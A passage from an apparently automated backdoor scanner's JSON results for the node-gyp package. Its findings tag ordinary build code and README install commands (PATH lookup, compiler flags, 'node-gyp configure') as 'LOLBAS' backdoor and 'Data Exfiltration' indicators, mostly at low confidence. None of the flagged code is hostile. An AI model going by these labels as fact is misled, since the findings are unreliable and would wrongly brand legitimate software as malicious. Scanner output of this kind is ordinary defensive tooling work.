                      "text": "    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n",
                      "markdown": "`    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 18,
                  "endLine": 43,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    new_args = []\n    for arg in args:\n        # Replace all double-quotes with double-double-quotes to escape\n        # them for cmd shell, and then quote the whole thing if there\n        # are any.\n        if arg.find('\"') != -1:\n            arg = '\"\"'.join(arg.split('\"'))\n",
                    "rendered": {
                      "text": "    new_args = []\n    for arg in args:\n        # Replace all double-quotes with double-double-quotes to escape\n        # them for cmd shell, and then quote the whole thing if there\n        # are any.\n        if arg.find('\"') != -1:\n            arg = '\"\"'.join(arg.split('\"'))\n",
                      "markdown": "`    new_args = []\n    for arg in args:\n        # Replace all double-quotes with double-double-quotes to escape\n        # them for cmd shell, and then quote the whole thing if there\n        # are any.\n        if arg.find('\"') != -1:\n            arg = '\"\"'.join(arg.split('\"'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 34,
                  "endLine": 22,
                  "endColumn": 38,
                  "snippet": {
                    "text": "     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n     be built needs to have a full path.\"\"\"\n    if \"/\" in command or \"\\\\\" in command:\n        # If the command already has path elements (either relative or\n",
                    "rendered": {
                      "text": "     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n     be built needs to have a full path.\"\"\"\n    if \"/\" in command or \"\\\\\" in command:\n        # If the command already has path elements (either relative or\n",
                      "markdown": "`     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n     be built needs to have a full path.\"\"\"\n    if \"/\" in command or \"\\\\\" in command:\n        # If the command already has path elements (either relative or\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 133,
                  "startColumn": 9,
                  "endLine": 133,
                  "endColumn": 15,
                  "snippet": {
                    "text": "            },\n        ]\n\n        # Find the config, and add it if it doesn't exist.\n        if config_name not in self.configurations:\n            self.AddConfig(config_name)\n\n",
                    "rendered": {
                      "text": "            },\n        ]\n\n        # Find the config, and add it if it doesn't exist.\n        if config_name not in self.configurations:\n            self.AddConfig(config_name)\n\n",
                      "markdown": "`            },\n        ]\n\n        # Find the config, and add it if it doesn't exist.\n        if config_name not in self.configurations:\n            self.AddConfig(config_name)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 31,
                  "endLine": 83,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    def AddDebugSettings(\n        self, config_name, command, environment={}, working_directory=\"\"\n    ):\n        \"\"\"Adds a DebugSettings node to the user file for a particular config.\n\n    Args:\n      command: command line to run.  First element in the list is the\n",
                    "rendered": {
                      "text": "    def AddDebugSettings(\n        self, config_name, command, environment={}, working_directory=\"\"\n    ):\n        \"\"\"Adds a DebugSettings node to the user file for a particular config.\n\n    Args:\n      command: command line to run.  First element in the list is the\n",
                      "markdown": "`    def AddDebugSettings(\n        self, config_name, command, environment={}, working_directory=\"\"\n    ):\n        \"\"\"Adds a DebugSettings node to the user file for a particular config.\n\n    Args:\n      command: command line to run.  First element in the list is the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 42,
                  "endLine": 29,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        # absolute), then assume it is constructed properly.\n        return command\n    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n",
                    "rendered": {
                      "text": "        # absolute), then assume it is constructed properly.\n        return command\n    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n",
                      "markdown": "`        # absolute), then assume it is constructed properly.\n        return command\n    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 29,
                  "endLine": 19,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\ndef _FindCommandInPath(command):\n    \"\"\"If there are no slashes in the command given, this function\n     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n",
                    "rendered": {
                      "text": "\ndef _FindCommandInPath(command):\n    \"\"\"If there are no slashes in the command given, this function\n     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n",
                      "markdown": "`\ndef _FindCommandInPath(command):\n    \"\"\"If there are no slashes in the command given, this function\n     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 22,
                  "endLine": 19,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\ndef _FindCommandInPath(command):\n    \"\"\"If there are no slashes in the command given, this function\n     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n",
                    "rendered": {
                      "text": "\ndef _FindCommandInPath(command):\n    \"\"\"If there are no slashes in the command given, this function\n     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n",
                      "markdown": "`\ndef _FindCommandInPath(command):\n    \"\"\"If there are no slashes in the command given, this function\n     searches the PATH env to find the given command, and converts it\n     to an absolute path.  We have to do this because MSVS is looking\n     for an actual file to launch a debugger on, not just a command\n     line.  Note that this happens at GYP time, so anything needing to\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 26,
                  "endLine": 31,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n            item = os.path.join(path, command)\n            if os.path.isfile(item) and os.access(item, os.X_OK):\n",
                    "rendered": {
                      "text": "    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n            item = os.path.join(path, command)\n            if os.path.isfile(item) and os.access(item, os.X_OK):\n",
                      "markdown": "`    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n            item = os.path.join(path, command)\n            if os.path.isfile(item) and os.access(item, os.X_OK):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 11,
                  "endLine": 95,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n        abs_command = _FindCommandInPath(command[0])\n\n        if environment and isinstance(environment, dict):\n            env_list = [f'{key}=\"{val}\"' for (key, val) in environment.items()]\n            environment = \" \".join(env_list)\n        else:\n",
                    "rendered": {
                      "text": "\n        abs_command = _FindCommandInPath(command[0])\n\n        if environment and isinstance(environment, dict):\n            env_list = [f'{key}=\"{val}\"' for (key, val) in environment.items()]\n            environment = \" \".join(env_list)\n        else:\n",
                      "markdown": "`\n        abs_command = _FindCommandInPath(command[0])\n\n        if environment and isinstance(environment, dict):\n            env_list = [f'{key}=\"{val}\"' for (key, val) in environment.items()]\n            environment = \" \".join(env_list)\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUserFile.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 19,
                  "endLine": 31,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n            item = os.path.join(path, command)\n            if os.path.isfile(item) and os.access(item, os.X_OK):\n",
                    "rendered": {
                      "text": "    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n            item = os.path.join(path, command)\n            if os.path.isfile(item) and os.access(item, os.X_OK):\n",
                      "markdown": "`    else:\n        # Search through the path list and find an existing file that\n        # we can access.\n        paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n        for path in paths:\n            item = os.path.join(path, command)\n            if os.path.isfile(item) and os.access(item, os.X_OK):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/_tokenizer.py"
                },
                "region": {
                  "startLine": 160,
                  "startColumn": 34,
                  "endLine": 160,
                  "endColumn": 38,
                  "snippet": {
                    "text": "        span_start: Optional[int] = None,\n        span_end: Optional[int] = None,\n    ) -> NoReturn:\n        \"\"\"Raise ParserSyntaxError at the given position.\"\"\"\n        span = (\n            self.position if span_start is None else span_start,\n            self.position if span_end is None else span_end,\n",
                    "rendered": {
                      "text": "        span_start: Optional[int] = None,\n        span_end: Optional[int] = None,\n    ) -> NoReturn:\n        \"\"\"Raise ParserSyntaxError at the given position.\"\"\"\n        span = (\n            self.position if span_start is None else span_start,\n            self.position if span_end is None else span_end,\n",
                      "markdown": "`        span_start: Optional[int] = None,\n        span_end: Optional[int] = None,\n    ) -> NoReturn:\n        \"\"\"Raise ParserSyntaxError at the given position.\"\"\"\n        span = (\n            self.position if span_start is None else span_start,\n            self.position if span_end is None else span_end,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/_tokenizer.py"
                },
                "region": {
                  "startLine": 109,
                  "startColumn": 46,
                  "endLine": 109,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        self.position = 0\n\n    def consume(self, name: str) -> None:\n        \"\"\"Move beyond provided token name, if at current position.\"\"\"\n        if self.check(name):\n            self.read()\n\n",
                    "rendered": {
                      "text": "        self.position = 0\n\n    def consume(self, name: str) -> None:\n        \"\"\"Move beyond provided token name, if at current position.\"\"\"\n        if self.check(name):\n            self.read()\n\n",
                      "markdown": "`        self.position = 0\n\n    def consume(self, name: str) -> None:\n        \"\"\"Move beyond provided token name, if at current position.\"\"\"\n        if self.check(name):\n            self.read()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/_elffile.py"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 31,
                  "endLine": 61,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        try:\n            # e_fmt: Format for program header.\n            # p_fmt: Format for section header.\n            # p_idx: Indexes to find p_type, p_offset, and p_filesz.\n            e_fmt, self._p_fmt, self._p_idx = {\n                (1, 1): (\"<HHIIIIIHHH\", \"<IIIIIIII\", (0, 1, 4)),  # 32-bit LSB.\n                (1, 2): (\">HHIIIIIHHH\", \">IIIIIIII\", (0, 1, 4)),  # 32-bit MSB.\n",
                    "rendered": {
                      "text": "        try:\n            # e_fmt: Format for program header.\n            # p_fmt: Format for section header.\n            # p_idx: Indexes to find p_type, p_offset, and p_filesz.\n            e_fmt, self._p_fmt, self._p_idx = {\n                (1, 1): (\"<HHIIIIIHHH\", \"<IIIIIIII\", (0, 1, 4)),  # 32-bit LSB.\n                (1, 2): (\">HHIIIIIHHH\", \">IIIIIIII\", (0, 1, 4)),  # 32-bit MSB.\n",
                      "markdown": "`        try:\n            # e_fmt: Format for program header.\n            # p_fmt: Format for section header.\n            # p_idx: Indexes to find p_type, p_offset, and p_filesz.\n            e_fmt, self._p_fmt, self._p_idx = {\n                (1, 1): (\"<HHIIIIIHHH\", \"<IIIIIIII\", (0, 1, 4)),  # 32-bit LSB.\n                (1, 2): (\">HHIIIIIHHH\", \">IIIIIIII\", (0, 1, 4)),  # 32-bit MSB.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 153,
                  "startColumn": 67,
                  "endLine": 153,
                  "endColumn": 71,
                  "snippet": {
                    "text": "```\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\nin `build/Debug/` or `build/Release/`, depending on the build mode. At this point,\nyou can require the `.node` file with Node.js and run your tests!\n\n__Note:__ To create a _Debug_ build of the bindings file, pass the `--debug` (or\n",
                    "rendered": {
                      "text": "```\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\nin `build/Debug/` or `build/Release/`, depending on the build mode. At this point,\nyou can require the `.node` file with Node.js and run your tests!\n\n__Note:__ To create a _Debug_ build of the bindings file, pass the `--debug` (or\n",
                      "markdown": "````\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\nin `build/Debug/` or `build/Release/`, depending on the build mode. At this point,\nyou can require the `.node` file with Node.js and run your tests!\n\n__Note:__ To create a _Debug_ build of the bindings file, pass the `--debug` (or\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 148,
                  "startColumn": 3,
                  "endLine": 149,
                  "snippet": {
                    "text": "Now you will have either a `Makefile` (on Unix platforms) or a `vcxproj` file\n(on Windows) in the `build/` directory. Next, invoke the `build` command:\n\n``` bash\nnode-gyp build\n```\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\n",
                    "rendered": {
                      "text": "Now you will have either a `Makefile` (on Unix platforms) or a `vcxproj` file\n(on Windows) in the `build/` directory. Next, invoke the `build` command:\n\n``` bash\nnode-gyp build\n```\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\n",
                      "markdown": "`Now you will have either a `Makefile` (on Unix platforms) or a `vcxproj` file\n(on Windows) in the `build/` directory. Next, invoke the `build` command:\n\n``` bash\nnode-gyp build\n```\n\nNow you have your compiled `.node` bindings file! The compiled bindings end up\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 3,
                  "endLine": 139,
                  "snippet": {
                    "text": "\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\nneeds to be added (not needed when run by npm as configured above):\n``` bash\nnode-gyp configure --msvs_version=2015\n```\n\n__Note__: The `configure` step looks for a `binding.gyp` file in the current\n",
                    "rendered": {
                      "text": "\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\nneeds to be added (not needed when run by npm as configured above):\n``` bash\nnode-gyp configure --msvs_version=2015\n```\n\n__Note__: The `configure` step looks for a `binding.gyp` file in the current\n",
                      "markdown": "`\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\nneeds to be added (not needed when run by npm as configured above):\n``` bash\nnode-gyp configure --msvs_version=2015\n```\n\n__Note__: The `configure` step looks for a `binding.gyp` file in the current\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 132,
                  "startColumn": 3,
                  "endLine": 133,
                  "snippet": {
                    "text": "The next step is to generate the appropriate project build files for the current\nplatform. Use `configure` for that:\n\n``` bash\nnode-gyp configure\n```\n\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\n",
                    "rendered": {
                      "text": "The next step is to generate the appropriate project build files for the current\nplatform. Use `configure` for that:\n\n``` bash\nnode-gyp configure\n```\n\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\n",
                      "markdown": "`The next step is to generate the appropriate project build files for the current\nplatform. Use `configure` for that:\n\n``` bash\nnode-gyp configure\n```\n\nAuto-detection fails for Visual C++ Build Tools 2015, so `--msvs_version=2015`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 3,
                  "endLine": 126,
                  "snippet": {
                    "text": "\nTo compile your native addon first go to its root directory:\n\n``` bash\ncd my_node_addon\n```\n\nThe next step is to generate the appropriate project build files for the current\n",
                    "rendered": {
                      "text": "\nTo compile your native addon first go to its root directory:\n\n``` bash\ncd my_node_addon\n```\n\nThe next step is to generate the appropriate project build files for the current\n",
                      "markdown": "`\nTo compile your native addon first go to its root directory:\n\n``` bash\ncd my_node_addon\n```\n\nThe next step is to generate the appropriate project build files for the current\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 46,
                  "endLine": 94,
                  "snippet": {
                    "text": "&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\npy --list-paths  # To see the installed Python versions\nset npm_config_python=C:\\path\\to\\python.exe  # CMD\n$Env:npm_config_python=\"C:\\path\\to\\python.exe\"  # PowerShell\n```\n\n3. If the `PYTHON` environment variable is set to the path of a Python executable,\n",
                    "rendered": {
                      "text": "&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\npy --list-paths  # To see the installed Python versions\nset npm_config_python=C:\\path\\to\\python.exe  # CMD\n$Env:npm_config_python=\"C:\\path\\to\\python.exe\"  # PowerShell\n```\n\n3. If the `PYTHON` environment variable is set to the path of a Python executable,\n",
                      "markdown": "`&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\npy --list-paths  # To see the installed Python versions\nset npm_config_python=C:\\path\\to\\python.exe  # CMD\n$Env:npm_config_python=\"C:\\path\\to\\python.exe\"  # PowerShell\n```\n\n3. If the `PYTHON` environment variable is set to the path of a Python executable,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 3,
                  "endLine": 88,
                  "snippet": {
                    "text": "2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\nPython installed, then you can set the `npm_config_python` environment variable\nto the appropriate path:\n``` bash\nexport npm_config_python=/path/to/executable/python\n```\n&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\n",
                    "rendered": {
                      "text": "2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\nPython installed, then you can set the `npm_config_python` environment variable\nto the appropriate path:\n``` bash\nexport npm_config_python=/path/to/executable/python\n```\n&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\n",
                      "markdown": "`2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\nPython installed, then you can set the `npm_config_python` environment variable\nto the appropriate path:\n``` bash\nexport npm_config_python=/path/to/executable/python\n```\n&nbsp;&nbsp;&nbsp;&nbsp;Or on Windows:\n```console\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 80,
                  "startColumn": 3,
                  "endLine": 81,
                  "snippet": {
                    "text": "\n1. by setting the `--python` command-line option, e.g.:\n\n``` bash\nnode-gyp <command> --python /path/to/executable/python\n```\n\n2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\n",
                    "rendered": {
                      "text": "\n1. by setting the `--python` command-line option, e.g.:\n\n``` bash\nnode-gyp <command> --python /path/to/executable/python\n```\n\n2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\n",
                      "markdown": "`\n1. by setting the `--python` command-line option, e.g.:\n\n``` bash\nnode-gyp <command> --python /path/to/executable/python\n```\n\n2. If `node-gyp` is called by way of `npm`, *and* you have multiple versions of\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/README.md"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 3,
                  "endLine": 53,
                  "snippet": {
                    "text": "### On Windows\n\nInstall tools with [Chocolatey](https://chocolatey.org):\n``` bash\nchoco install python visualstudio2022-workload-vctools -y\n```\n\nOr install and configure Python and Visual Studio tools manually:\n",
                    "rendered": {
